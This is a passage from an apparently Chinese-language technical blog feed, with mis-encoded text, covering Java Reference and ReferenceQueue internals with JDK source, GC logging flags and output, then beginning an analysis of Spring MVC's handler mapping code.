<li><code>Inactive</code>: Nothing more to do.  Once an instance becomes Inactive its state will never change again.(ç»ˆæ€)</li>
</ul>
<h3 id="å¼•ç”¨é“¾è¡¨"><a href="#å¼•ç”¨é“¾è¡¨" class="headerlink" title="å¼•ç”¨é“¾è¡¨"></a>å¼•ç”¨é“¾è¡¨</h3><p><code>Reference</code>ä¸­æœ‰äº”ä¸ªå…³é”®çš„å˜é‡:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> T referent;         <span class="comment">/* Treated specially by GC */</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">volatile</span> ReferenceQueue&lt;? <span class="keyword">super</span> T&gt; queue;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* When active:   NULL</span></span><br><span class="line"><span class="comment">    *     pending:   this</span></span><br><span class="line"><span class="comment">    *    Enqueued:   next reference in queue (or this if last)</span></span><br><span class="line"><span class="comment">    *    Inactive:   this</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="meta">@SuppressWarnings</span>(<span class="string">"rawtypes"</span>)</span><br><span class="line">   Reference next;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* When active:   next element in a discovered reference list maintained by GC (or this if last)</span></span><br><span class="line"><span class="comment">    *     pending:   next element in the pending list (or null if last)</span></span><br><span class="line"><span class="comment">    *   otherwise:   NULL</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">transient</span> <span class="keyword">private</span> Reference&lt;T&gt; discovered;  <span class="comment">/* used by VM */</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/* List of References waiting to be enqueued.  The collector adds</span></span><br><span class="line"><span class="comment">    * References to this list, while the Reference-handler thread removes</span></span><br><span class="line"><span class="comment">    * them.  This list is protected by the above lock object. The</span></span><br><span class="line"><span class="comment">    * list uses the discovered field to link its elements.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> Reference&lt;Object&gt; pending = <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li><p><code>referent</code></p>
<p>ä»£è¡¨å½“å‰æŒæœ‰çš„å¼•ç”¨. </p>
</li>
<li><p><code>queue</code></p>
<p>æ˜¯åˆå§‹åŒ–çš„æ—¶å€™ä¼ å…¥çš„, å¯ä»¥ä¸ºnull, å¦‚æœä¼ å…¥äº†<code>ReferenceQueue</code>, ä¼šæœ‰å…¥é˜Ÿåˆ—å’Œå‡ºé˜Ÿåˆ—çš„æ“ä½œ</p>
</li>
<li><p><code>next</code></p>
<p>ä»£è¡¨<code>ReferenceQueue</code>ä¸­çš„ä¸‹ä¸€ä¸ª, <code>Active</code>çŠ¶æ€ä¸‹æ˜¯null,<br><code>Pending</code>å’Œ<code>Inactive</code>çŠ¶æ€ä¸‹æŒ‡å‘è‡ªå·±, </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">   +-------+</span><br><span class="line">   |       |</span><br><span class="line">   v       |</span><br><span class="line">           |</span><br><span class="line">+-----+    |</span><br><span class="line">|     |    |</span><br><span class="line">|  1  +----+</span><br><span class="line">|     |</span><br><span class="line">+-----+</span><br></pre></td></tr></table></figure>
<p><code>Enqueued</code>çŠ¶æ€ä¸‹æŒ‡å‘<code>queue</code>ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ </p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">                         +-------+</span><br><span class="line">                         |       |</span><br><span class="line">                         v       |</span><br><span class="line">                                 |</span><br><span class="line">+-----+    +-----+    +-----+    |</span><br><span class="line">|     |    |     |    |     |    |</span><br><span class="line">|  1  +--&gt; |  2  +--&gt; |  3  +----+</span><br><span class="line">|     |    |     |    |     |</span><br><span class="line">+-----+    +-----+    +-----+</span><br></pre></td></tr></table></figure>
<ul>
<li><p><code>discovered</code></p>
<p><code>Active</code>çŠ¶æ€ä¸‹æŒ‡å‘<code>discovered reference list</code>ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ,<br><code>Pending</code>çŠ¶æ€ä¸‹æŒ‡å‘<code>pending list</code>ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ,<br>å…¶ä»–çŠ¶æ€ä¸‹æ˜¯null, ç›¸å…³çš„é“¾è¡¨æ˜¯JVMç»´æŠ¤çš„</p>
</li>
<li><p><code>pending</code></p>
</li>
</ul>
<p><code>pending</code>æŒ‡å‘çš„æ˜¯<code>pending list</code>é“¾è¡¨çš„head</p>
<h3 id="tryHandlePending"><a href="#tryHandlePending" class="headerlink" title="tryHandlePending"></a>tryHandlePending</h3><p>å¤„ç†å¼•ç”¨çš„ä»£ç :</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Try handle pending &#123;<span class="doctag">@link</span> Reference&#125; if there is one.&lt;p&gt;</span></span><br><span class="line"><span class="comment">     * Return &#123;<span class="doctag">@code</span> true&#125; as a hint that there might be another</span></span><br><span class="line"><span class="comment">     * &#123;<span class="doctag">@link</span> Reference&#125; pending or &#123;<span class="doctag">@code</span> false&#125; when there are no more pending</span></span><br><span class="line"><span class="comment">     * &#123;<span class="doctag">@link</span> Reference&#125;s at the moment and the program can do some other</span></span><br><span class="line"><span class="comment">     * useful work instead of looping.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> waitForNotify if &#123;<span class="doctag">@code</span> true&#125; and there was no pending</span></span><br><span class="line"><span class="comment">     *                      &#123;<span class="doctag">@link</span> Reference&#125;, wait until notified from VM</span></span><br><span class="line"><span class="comment">     *                      or interrupted; if &#123;<span class="doctag">@code</span> false&#125;, return immediately</span></span><br><span class="line"><span class="comment">     *                      when there is no pending &#123;<span class="doctag">@link</span> Reference&#125;.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> &#123;<span class="doctag">@code</span> true&#125; if there was a &#123;<span class="doctag">@link</span> Reference&#125; pending and it</span></span><br><span class="line"><span class="comment">     *         was processed, or we waited for notification and either got it</span></span><br><span class="line"><span class="comment">     *         or thread was interrupted before being notified;</span></span><br><span class="line"><span class="comment">     *         &#123;<span class="doctag">@code</span> false&#125; otherwise.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">tryHandlePending</span><span class="params">(<span class="keyword">boolean</span> waitForNotify)</span> </span>&#123;</span><br><span class="line">        Reference&lt;Object&gt; r;</span><br><span class="line">        Cleaner c;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (lock) &#123;</span><br><span class="line">                <span class="comment">// pending listä¸ä¸ºnull, è¯´æ˜æœ‰éœ€è¦å¤„ç†çš„å¼•ç”¨</span></span><br><span class="line">                <span class="keyword">if</span> (pending != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    r = pending;</span><br><span class="line">                    <span class="comment">// 'instanceof' might throw OutOfMemoryError sometimes</span></span><br><span class="line">                    <span class="comment">// so do this before un-linking 'r' from the 'pending' chain...</span></span><br><span class="line">                    c = r <span class="keyword">instanceof</span> Cleaner ? (Cleaner) r : <span class="keyword">null</span>;</span><br><span class="line">                    <span class="comment">// unlink 'r' from 'pending' chain</span></span><br><span class="line">                    <span class="comment">// ä»pending listä¸­åˆ é™¤r</span></span><br><span class="line">                    pending = r.discovered;</span><br><span class="line">                    r.discovered = <span class="keyword">null</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// The waiting on the lock may cause an OutOfMemoryError</span></span><br><span class="line">                    <span class="comment">// because it may try to allocate exception objects.</span></span><br><span class="line">                    <span class="keyword">if</span> (waitForNotify) &#123;</span><br><span class="line">                        <span class="comment">// æ²¡æœ‰éœ€è¦å¤„ç†çš„å¼•ç”¨, å°±wait, è¿™ä¸ªåº”è¯¥ä¼šè¢«JVMç»™notify</span></span><br><span class="line">                        lock.wait();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// retry if waited</span></span><br><span class="line">                    <span class="keyword">return</span> waitForNotify;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (OutOfMemoryError x) &#123;</span><br><span class="line">            <span class="comment">// Give other threads CPU time so they hopefully drop some live references</span></span><br><span class="line">            <span class="comment">// and GC reclaims some space.</span></span><br><span class="line">            <span class="comment">// Also prevent CPU intensive spinning in case 'r instanceof Cleaner' above</span></span><br><span class="line">            <span class="comment">// persistently throws OOME for some time...</span></span><br><span class="line">            Thread.yield();</span><br><span class="line">            <span class="comment">// retry</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException x) &#123;</span><br><span class="line">            <span class="comment">// retry</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Fast path for cleaners</span></span><br><span class="line">        <span class="keyword">if</span> (c != <span class="keyword">null</span>) &#123;</span><br><span class="line">            c.clean();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ReferenceQueue&lt;? <span class="keyword">super</span> Object&gt; q = r.queue;</span><br><span class="line">        <span class="comment">// å¦‚æœå…³è”äº†ReferenceQueue, å°±åŠ å…¥åˆ°ReferenceQueueä¸­</span></span><br><span class="line">        <span class="keyword">if</span> (q != ReferenceQueue.NULL) q.enqueue(r);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h2 id="ReferenceQueue"><a href="#ReferenceQueue" class="headerlink" title="ReferenceQueue"></a>ReferenceQueue</h2><p><code>ReferenceQueue</code>ç”¨ä¸€ä¸ªé“¾è¡¨æ¥ç»´æŠ¤é˜Ÿåˆ—é‡Œçš„<code>Reference</code></p>
<p>å…¥é˜Ÿåˆ—ç›¸å…³çš„æ“ä½œ:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">enqueue</span><span class="params">(Reference&lt;? extends T&gt; r)</span> </span>&#123; <span class="comment">/* Called only by Reference class */</span></span><br><span class="line">       <span class="keyword">synchronized</span> (lock) &#123; <span class="comment">// å’Œé˜Ÿåˆ—ç›¸å…³çš„é”</span></span><br><span class="line">           <span class="comment">// Check that since getting the lock this reference hasn't already been</span></span><br><span class="line">           <span class="comment">// enqueued (and even then removed)</span></span><br><span class="line">           <span class="comment">// æ ¡éªŒä¸‹rå¸¦çš„é˜Ÿåˆ—æ˜¯è‡ªå·±, å¹¶ä¸”å·²ç»enqueueçš„ä¸ä¼šé‡å¤enqueue</span></span><br><span class="line">           ReferenceQueue&lt;?&gt; queue = r.queue;</span><br><span class="line">           <span class="keyword">if</span> ((queue == NULL) || (queue == ENQUEUED)) &#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">assert</span> queue == <span class="keyword">this</span>;</span><br><span class="line"></span><br><span class="line">           <span class="comment">// ä¿®æ”¹Referenceçš„queueä¸ºENQUEUED, ä»£è¡¨å·²ç»å…¥é˜Ÿäº†</span></span><br><span class="line">           r.queue = ENQUEUED;</span><br><span class="line">           <span class="comment">// é“¾è¡¨çš„å¤´æ’å‘, å°†å½“å‰çš„å¼•ç”¨å…¥é˜Ÿ, å¹¶æ›´æ–°headçš„å€¼å’Œé˜Ÿåˆ—çš„é•¿åº¦</span></span><br><span class="line">           r.next = (head == <span class="keyword">null</span>) ? r : head;</span><br><span class="line">           head = r;</span><br><span class="line">           queueLength++;</span><br><span class="line">           <span class="keyword">if</span> (r <span class="keyword">instanceof</span> FinalReference) &#123;</span><br><span class="line">               sun.misc.VM.addFinalRefCount(<span class="number">1</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           lock.notifyAll();</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>å‡ºé˜Ÿåˆ—ç›¸å…³çš„æ“ä½œ:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">   <span class="keyword">private</span> Reference&lt;? extends T&gt; reallyPoll() &#123;       <span class="comment">/* Must hold lock */</span></span><br><span class="line">       Reference&lt;? extends T&gt; r = head;</span><br><span class="line">       <span class="keyword">if</span> (r != <span class="keyword">null</span>) &#123;</span><br><span class="line">           <span class="comment">// å› ä¸ºè¿™ä¸ªé˜Ÿåˆ—çš„å°¾èŠ‚ç‚¹çš„nextæ€»æ˜¯æŒ‡å‘è‡ªå·±, è¿™é‡Œåˆ¤æ–­å¦‚æœæ˜¯å°¾èŠ‚ç‚¹å‡ºé˜Ÿåˆ—, headç½®ä¸ºnull</span></span><br><span class="line">           head = (r.next == r) ?</span><br><span class="line">               <span class="keyword">null</span> :</span><br><span class="line">               r.next; <span class="comment">// Unchecked due to the next field having a raw type in Reference</span></span><br><span class="line">           <span class="comment">// ä¿®æ”¹å¯¹åº”queueçš„çŠ¶æ€, ä»£è¡¨å·²ç»å‡ºé˜Ÿåˆ—</span></span><br><span class="line">           r.queue = NULL;</span><br><span class="line">           <span class="comment">// å¯¹äºå‡ºé˜Ÿåˆ—çš„å¼•ç”¨, ä»–çš„nextä¹Ÿæ˜¯æŒ‡å‘è‡ªå·±çš„</span></span><br><span class="line">           r.next = r;</span><br><span class="line">           queueLength--;</span><br><span class="line">           <span class="keyword">if</span> (r <span class="keyword">instanceof</span> FinalReference) &#123;</span><br><span class="line">               sun.misc.VM.addFinalRefCount(-<span class="number">1</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">return</span> r;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<h2 id="openjdk"><a href="#openjdk" class="headerlink" title="openjdk"></a>openjdk</h2><blockquote>
<p>ä¸Šé¢ä¸¤ä¸ªå˜é‡å¯¹åº”åœ¨VMä¸­çš„è°ƒç”¨ï¼Œå¯ä»¥å‚è€ƒopenjdkä¸­çš„hotspotæºç ï¼Œåœ¨hotspot/src/share/vm/memory/referenceProcessor.cpp çš„ReferenceProcessor::discover_reference æ–¹æ³•ã€‚(æ ¹æ®æ­¤æ–¹æ³•çš„æ³¨é‡Šç”±äº†è§£åˆ°è™šæ‹Ÿæœºåœ¨å¯¹Referenceçš„å¤„ç†æœ‰ReferenceBasedDiscoveryå’ŒRefeferentBasedDiscoveryä¸¤ç§ç­–ç•¥)</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ReferenceProcessor::enqueue_discovered_reflist</span><span class="params">(DiscoveredList&amp; refs_list,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                    HeapWord* pending_list_addr)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Given a list of refs linked through the "discovered" field</span></span><br><span class="line">  <span class="comment">// (java.lang.ref.Reference.discovered), self-loop their "next" field</span></span><br><span class="line">  <span class="comment">// thus distinguishing them from active References, then</span></span><br><span class="line">  <span class="comment">// prepend them to the pending list.</span></span><br><span class="line">  <span class="comment">// BKWRD COMPATIBILITY <span class="doctag">NOTE:</span> For older JDKs (prior to the fix for 4956777),</span></span><br><span class="line">  <span class="comment">// the "next" field is used to chain the pending list, not the discovered</span></span><br><span class="line">  <span class="comment">// field.</span></span><br><span class="line">  ...</span><br><span class="line">                                                    &#125;</span><br></pre></td></tr></table></figure>
<h2 id="GCæ—¥å¿—"><a href="#GCæ—¥å¿—" class="headerlink" title="GCæ—¥å¿—"></a>GCæ—¥å¿—</h2><p>åœ¨jvmçš„å¯åŠ¨å‚æ•°ä¸­åŠ å…¥ä¸‹é¢çš„flag, å¯ä»¥æ‰“å¼€å¤„ç†å¼•ç”¨ç”¨æ‰çš„æ—¶é—´:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-XX:+PrintGCDetails -XX:+PrintReferenceGC</span><br></pre></td></tr></table></figure>
<p>æµ‹è¯•ä»£ç :</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testGc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       Object reference = <span class="keyword">new</span> Object();</span><br><span class="line">       <span class="keyword">final</span> WeakReference&lt;Object&gt; weakReference = <span class="keyword">new</span> WeakReference&lt;&gt;(reference);</span><br><span class="line"></span><br><span class="line">       Assert.assertEquals(reference, weakReference.get());</span><br><span class="line"></span><br><span class="line">       reference = <span class="keyword">null</span>;</span><br><span class="line">       System.gc();</span><br><span class="line"></span><br><span class="line">       <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * å½“æ‰€å¼•ç”¨çš„å¯¹è±¡åœ¨ JVM å†…ä¸å†æœ‰å¼ºå¼•ç”¨æ—¶, GC å weak reference å°†ä¼šè¢«è‡ªåŠ¨å›æ”¶</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       Assert.assertNull(weakReference.get());</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>æ—¥å¿—è¾“å‡º:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[GC (System.gc()) [SoftReference, 0 refs, 0.0000616 secs][WeakReference, 34 refs, 0.0000273 secs][FinalReference, 654 refs, 0.0003785 secs][PhantomReference, 0 refs, 0 refs, 0.0000060 secs][JNI Weak Reference, 0.0000023 secs][PSYoungGen: 10708K-&gt;1566K(56320K)] 10708K-&gt;1574K(184832K), 0.0083391 secs] [Times: user=0.01 sys=0.00, real=0.00 secs] </span><br><span class="line">[Full GC (System.gc()) [SoftReference, 0 refs, 0.0000153 secs][WeakReference, 1 refs, 0.0000035 secs][FinalReference, 85 refs, 0.0000111 secs][PhantomReference, 0 refs, 0 refs, 0.0000037 secs][JNI Weak Reference, 0.0000020 secs][PSYoungGen: 1566K-&gt;0K(56320K)] [ParOldGen: 8K-&gt;1438K(128512K)] 1574K-&gt;1438K(184832K), [Metaspace: 4770K-&gt;4770K(1056768K)], 0.0319906 secs] [Times: user=0.03 sys=0.00, real=0.04 secs] </span><br><span class="line">Heap</span><br><span class="line"> PSYoungGen      total 56320K, used 972K [0x0000000781e00000, 0x0000000785c80000, 0x00000007c0000000)</span><br><span class="line">  eden space 48640K, 2% used [0x0000000781e00000,0x0000000781ef3358,0x0000000784d80000)</span><br><span class="line">  from space 7680K, 0% used [0x0000000784d80000,0x0000000784d80000,0x0000000785500000)</span><br><span class="line">  to   space 7680K, 0% used [0x0000000785500000,0x0000000785500000,0x0000000785c80000)</span><br><span class="line"> ParOldGen       total 128512K, used 1438K [0x0000000705a00000, 0x000000070d780000, 0x0000000781e00000)</span><br><span class="line">  object space 128512K, 1% used [0x0000000705a00000,0x0000000705b679e0,0x000000070d780000)</span><br><span class="line"> Metaspace       used 4784K, capacity 5158K, committed 5248K, reserved 1056768K</span><br><span class="line">  class space    used 564K, capacity 593K, committed 640K, reserved 1048576K</span><br></pre></td></tr></table></figure>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ol>
<li><a href="http://hongjiang.info/java-referencequeue/#comment-4504" rel="external nofollow noopener noreferrer" target="_blank">è¯è¯´ReferenceQueue | å†™ç‚¹ä»€ä¹ˆ</a></li>
<li><a href="https://cordate.github.io/2018/03/06/java/SharedSecrets%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3/" rel="external nofollow noopener noreferrer" target="_blank">SharedSecretsæ·±å…¥ç†è§£ | æŸ³çµ®çº·é£</a></li>
<li><a href="http://www.iteye.com/topic/401478" rel="external nofollow noopener noreferrer" target="_blank">ç†è§£ Java çš„ GC ä¸ å¹½çµå¼•ç”¨ - Java - ITeyeè®ºå›</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> reference </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Spring Mvcæºç å‰–æ(äºŒ)]]></title>
      <url>http://qsli.github.io/2018/05/06/spring-mvc-2/</url>
      <content type="html"><![CDATA[<p>å¯åŠ¨æµç¨‹çš„åˆ†æè§: <a href="/2016/10/02/spring-mvc/" title="Spring Mvcæºç å‰–æ(ä¸€)">Spring Mvcæºç å‰–æ(ä¸€)</a></p>
<img src="/2018/05/06/spring-mvc-2/spring-mvc.png">
<h2 id="æºç ç‰ˆæœ¬"><a href="#æºç ç‰ˆæœ¬" class="headerlink" title="æºç ç‰ˆæœ¬"></a>æºç ç‰ˆæœ¬</h2><blockquote>
<p>4.3.6.RELEASE</p>
</blockquote>
<h2 id="HandlerExecutionChain"><a href="#HandlerExecutionChain" class="headerlink" title="HandlerExecutionChain"></a>HandlerExecutionChain</h2><p><em>request -&gt; executionchain</em></p>
<p>// RequestMappingHandlerMapping<br>éå†å·²æœ‰çš„<code>HandlerMapping</code>, æ‰¾åˆ°ç¬¬ä¸€ä¸ªèƒ½å¤„ç†çš„<code>HandlerMapping</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> HandlerExecutionChain <span class="title">getHandler</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (HandlerMapping hm : <span class="keyword">this</span>.handlerMappings) &#123;</span><br><span class="line">			<span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</span><br><span class="line">				logger.trace(</span><br><span class="line">						<span class="string">"Testing handler map ["</span> + hm + <span class="string">"] in DispatcherServlet with name '"</span> + getServletName() + <span class="string">"'"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			HandlerExecutionChain handler = hm.getHandler(request);</span><br><span class="line">			<span class="keyword">if</span> (handler != <span class="keyword">null</span>) &#123;</span><br><span class="line">				<span class="keyword">return</span> handler;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>handlerMappingsçš„å€¼é»˜è®¤æ˜¯:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">this.handlerMappings = &#123;ArrayList@5980&#125;  size = 2</span><br><span class="line"> 0 = &#123;RequestMappingHandlerMapping@5997&#125; </span><br><span class="line"> 1 = &#123;BeanNameUrlHandlerMapping@6002&#125;</span><br></pre></td></tr></table></figure>
<p>org.springframework.web.servlet.handler.AbstractHandlerMapping#getHandler</p>
<p>executionchainå°±æ˜¯interceptorå’Œå®é™…å¤„ç†æ–¹æ³•çš„ç»“åˆä½“</p>
<h3 id="æ˜ å°„å…³ç³»"><a href="#æ˜ å°„å…³ç³»" class="headerlink" title="æ˜ å°„å…³ç³»"></a>æ˜ å°„å…³ç³»</h3><p><em>url -&gt; HandlerMethod</em></p>
<p>org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#getHandlerInternal</p>
<p><code>HandlerMethod</code>æ˜¯å…·ä½“çš„controllerå¯¹åº”çš„æ–¹æ³•.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mappingLookup = &#123;LinkedHashMap@6069&#125;  size = 4</span><br><span class="line"> 0 = &#123;LinkedHashMap$Entry@6077&#125; &quot;&#123;[/async]&#125;&quot; -&gt; &quot;public java.util.concurrent.Callable&lt;java.lang.String&gt; com.air.mvc.AsyncController.asyncProcess()&quot;</span><br><span class="line"> 1 = &#123;LinkedHashMap$Entry@6078&#125; &quot;&#123;[/asyncV2]&#125;&quot; -&gt; &quot;public org.springframework.web.context.request.async.DeferredResult&lt;java.lang.String&gt; com.air.mvc.AsyncController.aysncProcess2()&quot;</span><br><span class="line"> 2 = &#123;LinkedHashMap$Entry@6079&#125; &quot;&#123;[/mvc/echo]&#125;&quot; -&gt; &quot;private java.lang.String com.air.mvc.SampleController.echo(javax.servlet.http.HttpServletRequest)&quot;</span><br><span class="line"> 3 = &#123;LinkedHashMap$Entry@6080&#125; &quot;&#123;[/mvc/test]&#125;&quot; -&gt; &quot;private java.lang.String 